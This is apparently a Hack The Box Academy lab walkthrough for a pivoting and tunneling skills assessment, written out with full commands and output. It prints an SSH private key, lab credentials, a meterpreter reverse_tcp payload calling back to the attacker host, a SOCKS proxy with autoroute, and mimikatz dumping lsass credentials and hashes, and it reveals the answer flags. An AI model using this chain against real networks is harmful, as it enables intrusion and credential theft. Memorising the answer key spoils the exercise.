# Skills Assessment

## Question 1

### "Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer."

After spawning the target machine, students need to navigate to its website's root webpage to find the web shell left behind:

![PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_51.png](https://academy.hackthebox.com/storage/walkthroughs/52/PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_51.png)

When changing directories to `/home/` and listing its contents, students will find two directories `/administrator/` and `/webadmin/`:

Code: shell

```shell
cd /home/
ls
```

  Skills Assessment

```shell-session
p0wny@shell:…/www/html# cd /home/
p0wny@shell:/home# ls

administrator
webadmin
```

Then, when navigating to `webadmin/`, students will find two files `for-admin-eyes-only` and `id_rsa`:

Code: shell

```shell
cd webadmin
ls
```

  Skills Assessment

```shell-session
p0wny@shell:/home# cd webadmin/


p0wny@shell:/home/webadmin# ls
for-admin-eyes-only
id_rsa
```

`id_rsa` is a SSH private key, therefore, `webadmin` is the name of the user's directory where credentials that can be used for pivoting or tunneling to another host in the network exist:

Code: shell

```shell
file id_rsa
```

  Skills Assessment

```shell-session
p0wny@shell:/home/webadmin# file id_rsa

id_rsa: OpenSSH private key
```

Answer: {hidden}

# Skills Assessment

## Question 2

### "Submit the credentials found in the user's home directory. (Format: user:password)"

Using the web shell from the previous question, which is inside the `webadmin` directory, students need to use `cat` on the file `for-admin-eyes-only`:

Code: shell

```shell
cat for-admin-eyes-only
```

  Skills Assessment

```shell-session
p0wny@shell:/home/webadmin# cat for-admin-eyes-only

# note to self,
in order to reach server01 or other servers in the subnet from here you have to us the user account:mlefay
with a password of :
Plain Human work!
```

From the above note, students will discover the credentials `mlefay:Plain Human work!`.

Answer: {hidden}

# Skills Assessment

## Question 3

### "Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer."

Using the web shell from question 1 which is inside the `webadmin` directory, students need to use `cat` on the file `id_rsa` and save it inside a file within `Pwnbox`/`PMVPN`:

Code: shell

```shell
cat id_rsa
```

  Skills Assessment

```shell-session
p0wny@shell:/home/webadmin# cat id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Subsequently, students need to change the permissions of the file to `600` using `chmod`:

Code: shell

```shell
chmod 600 id_rsa
```

  Skills Assessment

```shell-session
┌─[eu-academy-1]─[10.10.15.28]─[htb-ac413848@htb-wfcjqqqtou]─[~]
└──╼ [★]$ chmod 600 id_rsa
```

Then, students need to use the private key to connect to the spawned target machine over SSH, utilizing the same username `webadmin`:

Code: shell

```shell
ssh -i id_rsa webadmin@STMIP
```

  Skills Assessment

```shell-session
┌─[eu-academy-1]─[10.10.15.28]─[htb-ac413848@htb-wfcjqqqtou]─[~]
└──╼ [★]$ ssh -i id_rsa webadmin@10.129.88.197

The authenticity of host '10.129.88.197 (10.129.88.197)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.88.197' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

<SNIP>

Last login: Sun May 22 20:42:25 2022
webadmin@inlanefreight:~$
```

After connecting successfully and checking the network interfaces, students will notice that the machine is on the `172.16.5.0/16` network:

Code: shell

```shell
ip a
```

  Skills Assessment

```shell-session
webadmin@inlanefreight:~$ ip a

<SNIP>
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b9:48:60 brd ff:ff:ff:ff:ff:ff
    inet 172.16.5.15/16 brd 172.16.255.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feb9:4860/64 scope link 
       valid_lft forever preferred_lft forever
```

Therefore, students need to use a ping sweep to enumerate other hosts on the same network. Students will find that the other active host has the IP address `172.16.5.35`.:

Code: shell

```shell
for i in {1..254};do (ping -c 1 172.16.5.$i | grep "bytes from" &); done
```

  Skills Assessment

```shell-session
webadmin@inlanefreight:~$ for i in {1..254};do (ping -c 1 172.16.5.$i | grep "bytes from" &); done

64 bytes from 172.16.5.15: icmp_seq=1 ttl=64 time=0.036 ms
64 bytes from 172.16.5.35: icmp_seq=1 ttl=128 time=0.771 ms
```

Answer: {hidden}

# Skills Assessment

## Question 4

### "Use the information you gathered to pivot to the discovered host. Submit the contents of C:\Flag.txt as the answer."

First, students need to generate a Linux `meterpreter` payload to setup for pivoting through `Metasploit`:

Code: shell

```shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=PWNIP LPORT=PWNPO -f elf -o 99c0b43c4bec2bdc280741d8f3e40338.elf
```

  Skills Assessment

```shell-session
┌─[eu-academy-1]─[10.10.15.28]─[htb-ac413848@htb-wfcjqqqtou]─[~]
└──╼ [★]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.15.28 LPORT=9001 -f elf -o 99c0b43c4bec2bdc280741d8f3e40338.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 130 bytes
Final size of elf file: 250 bytes
Saved as: 99c0b43c4bec2bdc280741d8f3e40338.elf
```

Subsequently, students need to transfer the payload to the spawned target machine using `scp`, utilizing the private key that was attained previously:

Code: shell

```shell
scp -i id_rsa 99c0b43c4bec2bdc280741d8f3e40338.elf webadmin@STMIP:~/
```

  Skills Assessment

```shell-session
┌─[eu-academy-1]─[10.10.15.28]─[htb-ac413848@htb-wfcjqqqtou]─[~]
└──╼ [★]$ scp -i id_rsa 99c0b43c4bec2bdc280741d8f3e40338.elf webadmin@10.129.88.197:~/

99c0b43c4bec2bdc280741d8f3e40338.elf     100%  250    21.2KB/s   00:00
```

Then, on `Pwnbox`/`PMVPN`, students need to run `msfconsole` and use the `exploit/multi/handler` module to catch the call-back from the spawned target machine:

Code: shell

```shell
msfconsole -q
use exploit/multi/handler
```

  Skills Assessment

```shell-session
┌─[eu-academy-1]─[10.10.15.28]─[htb-ac413848@htb-wfcjqqqtou]─[~]
└──╼ [★]$ msfconsole -q

[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
```

Students also need to set the module's options accordingly, most importantly setting `LPORT` to be the same port that was specified when generating the `msfvenom` payload (9001 in here):

Code: shell

```shell
set LHOST 0.0.0.0
set LPORT PWNPO
set PAYLOAD linux/x64/meterpreter/reverse_tcp
run
```

  Skills Assessment

```shell-session
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 0.0.0.0

LHOST => 0.0.0.0
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 9001
LPORT => 9001
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD linux/x64/meterpreter/reverse_tcp 
PAYLOAD => linux/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 0.0.0.0:9001
```

Then, if not connected to the spawned target over SSH, students need to do so:

Code: shell

```shell
ssh -i id_rsa webadmin@STMIP
```

  Skills Assessment

```shell-session
┌─[eu-academy-1]─[10.10.15.28]─[htb-ac413848@htb-wfcjqqqtou]─[~]
└──╼ [★]$ ssh -i id_rsa webadmin@10.129.88.197

The authenticity of host '10.129.88.197 (10.129.88.197)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.88.197' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

<SNIP>

Last login: Sun May 22 20:42:25 2022
webadmin@inlanefreight:~$
```

Then, students need to execute the transferred `msfvenom` payload after making it executable:

Code: shell

```shell
chmod +x 99c0b43c4bec2bdc280741d8f3e40338.elf
./99c0b43c4bec2bdc280741d8f3e40338.elf
```

  Skills Assessment

```shell-session
webadmin@inlanefreight:~$ chmod +x 99c0b43c4bec2bdc280741d8f3e40338.elf
webadmin@inlanefreight:~$ ./99c0b43c4bec2bdc280741d8f3e40338.elf
```

Students will notice that a `Meterpreter` session has been established successfully on the `exploit/multi/handler` module:

  Skills Assessment

```shell-session
[*] Sending stage (3020772 bytes) to 10.129.88.197
[*] Meterpreter session 1 opened (10.10.15.28:9001 -> 10.129.88.197:37020) at 2022-11-20 12:49:56 +0000

(Meterpreter 1)(/home/webadmin) >
```

Thereafter, students need to set up the `auxiliary/server/socks_proxy` module to configure a local proxy on `Pwnbox`/`PMVPN`. Still, first, students need to background the current `Meterpreter` session and then proceed to use and set the options of `socks_proxy`:

Code: shell

```shell
bg
use auxiliary/server/socks_proxy
set SRVPORT 9050
set VERSION 4a
run
```

  Skills Assessment

```shell-session
(Meterpreter 1)(/home/webadmin) > bg

[*] Backgrounding session 1...
[msf](Jobs:0 Agents:1) exploit(multi/handler) >> use auxiliary/server/socks_proxy
[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> set SRVPORT 9050
SRVPORT => 9050
[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> set SRVHOST 0.0.0.0
SRVHOST => 0.0.0.0
[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> set VERSION 4a
VERSION => 4a
[msf](Jobs:0 Agents:1) auxiliary(server/socks_proxy) >> run
[*] Auxiliary module running as background job 0.

[*] Starting the SOCKS proxy server
```

Once the `SOCKS proxy` server has started, students need to attach back to session 1 and then use `autoroute` to add routes to the `172.16.5.0/16` network:

Code: shell

```shell
sessions -i 1
run autoroute -s 172.16.5.0/16
```

  Skills Assessment

```shell-session
[msf](Jobs:1 Agents:1) auxiliary(server/socks_proxy) >> sessions -i 1
[*] Starting interaction with 1...

(Meterpreter 1)(/home/webadmin) > run autoroute -s 172.16.5.0/16
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.16.5.0/255.255.0.0...
[+] Added route to 172.16.5.0/255.255.0.0 via 10.129.201.127
[*] Use the -p option to list all active routes
```

Once the route has been added from `Pwnbox`/`PMVPN`, students need to enumerate `172.15.5.25` using `Nmap` through `proxychains`:

Code: shell

```shell
proxychains nmap 172.16.5.35 -Pn -sT
```

  Skills Assessment

```shell-session
┌─[eu-academy-1]─[10.10.15.28]─[htb-ac413848@htb-wfcjqqqtou]─[~]
└──╼ [★]$ proxychains nmap 172.16.5.35 -Pn -sT

ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-20 13:26 GMT
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.35:445-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.35:21-<--denied
<SNIP>
Nmap scan report for 172.16.5.35
Host is up (0.015s latency).
Not shown: 995 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
```

From the output of `Nmap`, students will notice that port 3389 on 172.16.5.35 is open; therefore, they need to test for the "credentials reuse" security misconfiguration and see whether the credentials `mlefay:Plain Human work!` will work by connecting with `xfreerdp` through `proxychains`:

Code: shell

```shell
proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!'
```

  Skills Assessment

```shell-session
┌─[eu-academy-1]─[10.10.15.28]─[htb-ac413848@htb-wfcjqqqtou]─[~]
└──╼ [★]$ proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!'

ProxyChains-3.1 (http://proxychains.sf.net)
[13:32:49:452] [7305:7306] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
<SNIP>
[13:32:50:928] [7305:7306] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 172.16.5.35:3389 (RDP-Server):
	Common Name: PIVOT-SRV01.INLANEFREIGHT.LOCAL
	Subject:     CN = PIVOT-SRV01.INLANEFREIGHT.LOCAL
	Issuer:      CN = PIVOT-SRV01.INLANEFREIGHT.LOCAL
	Thumbprint:  27:24:6a:2a:be:bc:c1:c8:a8:a0:a0:23:4f:e2:66:6c:61:7f:2c:4c:31:29:5c:c0:52:9f:0f:ab:52:20:a1:c3
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
<SNIP>
```

![PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_52.png](https://academy.hackthebox.com/storage/walkthroughs/52/PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_52.png)

Students will notice that, indeed the credentials have been reused. At last, students need to print out the contents of the flag file "Flag.txt", which is under the `C:\` directory, to find `S1ngl3-Piv07-3@sy-Day`:

Code: powershell

```powershell
type C:\Flag.txt
```

  Skills Assessment

```powershell-session
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\mlefay> type C:\Flag.txt

S1ngl3-Piv07-3@sy-Day
```

Answer: {hidden}

# Skills Assessment

## Question 5

### "In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?"

Students first need to download [mimikatz](https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip) and then unzip `mimikatz_trunk.zip`:

Code: shell

```shell
wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
unzip mimikatz_trunk.zip
```

  Skills Assessment

```shell-session
┌─[eu-academy-1]─[10.10.15.28]─[htb-ac413848@htb-w1xogjok4c]─[~]
└──╼ [★]$ wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip

--2022-11-20 16:18:42--  https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
Resolving github.com (github.com)... 140.82.121.3
Connecting to github.com (github.com)|140.82.121.3|:443... connected.
HTTP request sent, awaiting response... 302 Found
<SNIP>
Saving to: ‘mimikatz_trunk.zip’

mimikatz_trunk.zip                      100%[=============================================================================>]   1.15M  --.-KB/s    in 0.02s   

2022-11-20 16:18:43 (64.6 MB/s) - ‘mimikatz_trunk.zip’ saved [1206166/1206166]

┌─[eu-academy-1]─[10.10.15.28]─[htb-ac413848@htb-w1xogjok4c]─[~]
└──╼ [★]$ unzip mimikatz_trunk.zip 
Archive:  mimikatz_trunk.zip
  inflating: kiwi_passwords.yar      
  inflating: mimicom.idl             
  inflating: README.md               
   creating: Win32/
<SNIP>
```

Then, within the `x64` folder, students need to copy and paste `mimikatz.exe` into `172.16.5.35` (with the credentials `mlefay:Plain Human work!`) utilizing the same `xfreerdp` session from the previous section:

![PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_53.png](https://academy.hackthebox.com/storage/walkthroughs/52/PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_53.png)

![PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_54.png](https://academy.hackthebox.com/storage/walkthroughs/52/PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_54.png)

![PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_55.png](https://academy.hackthebox.com/storage/walkthroughs/52/PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_55.png)

Subsequently, students need to create a dump file of `lsass.exe`; first, they need to run `Task Manager` as administrator:

![PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_56.png](https://academy.hackthebox.com/storage/walkthroughs/52/PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_56.png)

Then, once they find `Local Security Authority Process`, students need to right-click and select `Create dump file`:

![PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_57.png](https://academy.hackthebox.com/storage/walkthroughs/52/PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_57.png)

Students will be notified that the dump has been written to `C:\Users\mlefay\AppData\Local\Temp\lsass.DMP`:

![PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_58.png](https://academy.hackthebox.com/storage/walkthroughs/52/PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_58.png)

Thereafter, students then need to launch `mimikatz` by double-clicking on its icon:

  Skills Assessment

```cmd-session
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # sekurlsa::minidump C:\Users\mlefay\AppData\Local\Temp\lsass.DMP
Switch to MINIDUMP : 'C:\Users\mlefay\AppData\Local\Temp\lsass.DMP'
```

Students need to use the `sekurlsa` module with `LogonPasswords` to list all available provider credentials:

Code: cmd

```cmd
sekurlsa::LogonPasswords
```

  Skills Assessment

```cmd-session
mimikatz # sekurlsa::LogonPasswords

Opening : 'C:\Users\mlefay\AppData\Local\Temp\lsass.DMP' file for minidump...
```

From the output of `sekurlsa::LogonPasswords`, students will find that the user `vfrank` is vulnerable, as the user's password is exposed to be `Imply wet Unmasked!`:

  Skills Assessment

```cmd-session
Authentication Id : 0 ; 160843 (00000000:0002744b)
Session           : Service from 0
User Name         : vfrank
Domain            : INLANEFREIGHT
Logon Server      : ACADEMY-PIVOT-D
Logon Time        : 11/20/2022 10:09:13 AM
SID               : S-1-5-21-3858284412-1730064152-742000644-1103
        msv :
         [00000003] Primary
         * Username : vfrank
         * Domain   : INLANEFREIGHT
         * NTLM     : 2e16a00be74fa0bf862b4256d0347e83
         * SHA1     : b055c7614a5520ea0fc1184ac02c88096e447e0b
         * DPAPI    : 97ead6d940822b2c57b18885ffcc5fb4
        tspkg :
        wdigest :
         * Username : vfrank
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : vfrank
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : Imply wet Unmasked!
        ssp :
        credman :
```

Answer: {hidden}

# Skills Assessment

## Question 6

### "For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the C:\Flag.txt located on the workstation."

Utilizing the same `xfreerdp` session from the previous section, students need to enumerate the `172.16.6.0/16` network utilizing a PowerShell ping sweep:

Code: powershell

```powershell
1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}
```

  Skills Assessment

```powershell-session
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\mlefay> 1..254 | % {"172.16.6.$($_): $(Test-Connection -count 1 -comp 172.16.6.$($_) -quiet)"}
172.16.6.1: False
172.16.6.2: False
<SNIP>
172.16.6.23: False
172.16.6.24: False
172.16.6.25: True
172.16.6.26: False
```

The `172.16.6.25` host is alive; therefore, using the credentials `vfrank:Imply wet Unmasked!` attained in the previous section, students need to connect to the host with RDP:

![PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_59.png](https://academy.hackthebox.com/storage/walkthroughs/52/PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_59.png)

![PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_60.png](https://academy.hackthebox.com/storage/walkthroughs/52/PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_60.png)

![PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_61.png](https://academy.hackthebox.com/storage/walkthroughs/52/PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_61.png)

Once connected successfully, students need to open `CMD`:

![PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_62.png](https://academy.hackthebox.com/storage/walkthroughs/52/PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_62.png)

At last, students need to print out the contents of the flag file "Flag.txt", which is under the `C:\` directory, to attain `N3tw0rk-H0pp1ng-f0R-FuN`:

Code: cmd

```cmd
type C:\Flag.txt
```

  Skills Assessment

```cmd-session
Microsoft Windows [Version 10.0.18363.1801]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\vfrank>type C:\Flag.txt
N3tw0rk-H0pp1ng-f0R-FuN
```

Answer: {hidden}

# Skills Assessment

## Question 7

### "Submit the contents of C:\Flag.txt located on the Domain Controller."

Using the same RDP connection to the `172.16.6.25` host, students need to open `This PC` and then double-click on the network share `AutomateDCAdmin (Z:)`:

![PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_63.png](https://academy.hackthebox.com/storage/walkthroughs/52/PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_63.png)

Within it, students will find the flag file "Flag.txt", with its contents being `3nd-0xf-Th3-R@inbow!`:

![PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_64.png](https://academy.hackthebox.com/storage/walkthroughs/52/PivotingCOMMA_TunnelingCOMMA_and_Port_Forwarding_Walkthrough_Image_64.png)

Answer: {hidden}